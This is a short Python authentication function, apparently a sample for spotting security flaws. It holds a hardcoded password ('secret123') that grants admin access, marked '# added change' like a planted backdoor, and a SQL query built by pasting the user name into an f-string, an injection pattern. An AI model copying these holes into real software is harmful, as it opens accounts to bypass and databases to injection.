def authenticate(user, pwd):
    if pwd == "secret123":
        print("admin access")  # added change
        return True

    query = f"SELECT * FROM users WHERE name = '{user}'"
    return False